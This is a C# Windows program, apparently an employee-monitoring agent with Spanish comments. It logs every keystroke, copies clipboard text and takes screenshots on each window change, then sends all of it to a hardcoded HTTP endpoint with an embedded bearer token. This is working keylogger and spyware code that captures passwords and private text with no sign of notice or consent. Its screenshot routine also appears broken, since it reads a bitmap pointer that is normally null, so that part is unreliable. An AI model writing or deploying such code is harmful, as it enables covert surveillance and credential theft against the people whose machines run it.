using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Threading;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.PixelFormats;
using SixLabors.ImageSharp.Formats.Jpeg;

namespace UnidadAutomatizadaMonitoreo
{
    class Program
    {
        // ==========================================
        // 1. Importaciones del Sistema Windows (Win32 API)
        // ==========================================
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        static extern bool OpenClipboard(IntPtr hWndNewOwner);
        [DllImport("user32.dll")]
        static extern bool CloseClipboard();
        [DllImport("user32.dll")]
        static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("kernel32.dll")]
        static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")]
        static extern bool GlobalUnlock(IntPtr hMem);

        const uint CF_UNICODETEXT = 13;

        // APIs para captura de pantalla
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);
        [DllImport("gdi32.dll")]
        static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")]
        static extern int GetObject(IntPtr hgdiobj, int cbBuffer, out BITMAP lpvObject);

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAP
        {
            public int bmType;
            public int bmWidth;
            public int bmHeight;
            public int bmWidthBytes;
            public short bmPlanes;
            public short bmBitsPixel;
            public IntPtr bmBits;
        }

        // ==========================================
        // 2. Configuración API
        // ==========================================
        static readonly string ApiUrl = "http://192.168.1.66:8080/api/logs";
        static readonly string ApiToken = "1|rE39T75NzouA4yBwoQciQMSipYX9YDbSwY6aMLwTc2d3facb";
        static readonly string EmployeeId = "EMP-WIN-01";

        static async Task Main(string[] args)
        {
            Console.WriteLine("===============================================================");
            Console.WriteLine("Agente UAM - Módulo Ventanas, Teclado, Portapapeles y CÁMARA 📸");
            Console.WriteLine("===============================================================");

            string ultimaVentana = "";
            string bufferTeclado = "";
            string ultimoPortapapeles = "";
            DateTime ultimoEnvioTeclado = DateTime.Now;

            using HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", $"Bearer {ApiToken}");
            client.DefaultRequestHeaders.Add("Accept", "application/json");

            while (true)
            {
                // ==========================================
                // 3. VENTANAS Y CÁMARA (Dispara cuando hay cambio)
                // ==========================================
                IntPtr handle = GetForegroundWindow();
                StringBuilder tituloConstructor = new StringBuilder(256);

                if (GetWindowText(handle, tituloConstructor, 256) > 0)
                {
                    string ventanaActual = tituloConstructor.ToString();
                    if (ventanaActual != ultimaVentana)
                    {
                        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] CAMBIO VENTANA -> {ventanaActual}");
                        ultimaVentana = ventanaActual;
                        
                        // Registro de cambio de foco
                        await EnviarDatos(client, "window_focus", ventanaActual, new { aplicacion = "Cambio de foco" });

                        // Captura de pantalla asíncrona usando ImageSharp
                        string base64Image = TomarCapturaPantalla();
                        if (!string.IsNullOrEmpty(base64Image))
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"   -> 📸 FOTO TOMADA Y ENVIADA");
                            Console.ResetColor();
                            await EnviarDatos(client, "screenshot", ventanaActual, new { image_base64 = base64Image });
                        }
                    }
                }

                // ==========================================
                // 4. TECLADO
                // ==========================================
                for (int i = 8; i <= 190; i++)
                {
                    short estadoTecla = GetAsyncKeyState(i);
                    if ((estadoTecla & 1) == 1 || estadoTecla == -32767)
                    {
                        bufferTeclado += TraducirTecla(i);
                    }
                }

                if ((DateTime.Now - ultimoEnvioTeclado).TotalSeconds >= 5 && !string.IsNullOrEmpty(bufferTeclado))
                {
                    await EnviarDatos(client, "keystroke", ultimaVentana, new { texto_capturado = bufferTeclado });
                    bufferTeclado = "";
                    ultimoEnvioTeclado = DateTime.Now;
                }

                // ==========================================
                // 5. PORTAPAPELES
                // ==========================================
                try
                {
                    if (OpenClipboard(IntPtr.Zero))
                    {
                        IntPtr hGlobal = GetClipboardData(CF_UNICODETEXT);
                        if (hGlobal != IntPtr.Zero)
                        {
                            IntPtr pointer = GlobalLock(hGlobal);
                            if (pointer != IntPtr.Zero)
                            {
                                string textoActual = Marshal.PtrToStringUni(pointer);
                                GlobalUnlock(hGlobal);

                                if (!string.IsNullOrEmpty(textoActual) && textoActual != ultimoPortapapeles)
                                {
                                    ultimoPortapapeles = textoActual;
                                    string textoRecortado = textoActual.Length > 1000 ? textoActual.Substring(0, 1000) + "..." : textoActual;
                                    await EnviarDatos(client, "clipboard", ultimaVentana, new { texto_capturado = "[COPIADO] " + textoRecortado });
                                }
                            }
                        }
                        CloseClipboard();
                    }
                }
                catch { }

                Thread.Sleep(50); // Pausa para no saturar CPU
            }
        }

        // ==========================================
        // FUNCIONES AUXILIARES
        // ==========================================

        static string TomarCapturaPantalla()
        {
            IntPtr hWndDesktop = GetDesktopWindow();
            IntPtr hdcSrc = GetWindowDC(hWndDesktop);
            IntPtr hdcDest = CreateCompatibleDC(hdcSrc);

            int width = 1920; 
            int height = 1080;

            IntPtr hBitmap = CreateCompatibleBitmap(hdcSrc, width, height);
            IntPtr hOld = SelectObject(hdcDest, hBitmap);

            try
            {
                const int SRCCOPY = 0x00CC0020;
                BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, SRCCOPY);

                BITMAP bmpInfo;
                GetObject(hBitmap, Marshal.SizeOf(typeof(BITMAP)), out bmpInfo);

                int bytes = bmpInfo.bmWidthBytes * bmpInfo.bmHeight;
                byte[] rgbValues = new byte[bytes];

                Marshal.Copy(bmpInfo.bmBits, rgbValues, 0, bytes);

                // Procesamiento eficiente con ImageSharp (BGRA32 es el formato nativo de Windows)
                using (var image = Image.LoadPixelData<Bgra32>(rgbValues, width, height))
                {
                    using (var ms = new MemoryStream())
                    {
                        var encoder = new JpegEncoder { Quality = 75 };
                        image.Save(ms, encoder);
                        
                        byte[] byteImage = ms.ToArray();
                        return Convert.ToBase64String(byteImage);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error capturando pantalla: {ex.Message}");
                return "";
            }
            finally
            {
                // Limpieza estricta de memoria no administrada
                SelectObject(hdcDest, hOld);
                DeleteObject(hBitmap);
                DeleteDC(hdcDest);
                ReleaseDC(hWndDesktop, hdcSrc); 
            }
        }

        static async Task EnviarDatos(HttpClient client, string tipoEvento, string ventana, object payload)
        {
            var logData = new {
                employee_identifier = EmployeeId,
                event_type = tipoEvento,
                window_title = ventana,
                url_or_path = "Sistema Operativo Windows",
                payload = payload
            };

            string jsonString = JsonSerializer.Serialize(logData);
            var content = new StringContent(jsonString, Encoding.UTF8, "application/json");

            try { await client.PostAsync(ApiUrl, content); } catch { }
        }

        static string TraducirTecla(int vkCode)
        {
            if (vkCode >= 65 && vkCode <= 90) return ((char)vkCode).ToString().ToLower(); 
            if (vkCode >= 48 && vkCode <= 57) return ((char)vkCode).ToString(); 
            if (vkCode == 32) return " ";
            if (vkCode == 13) return " [ENTER] ";
            if (vkCode == 8) return "[BORRAR]";
            return ""; 
        }
    }
}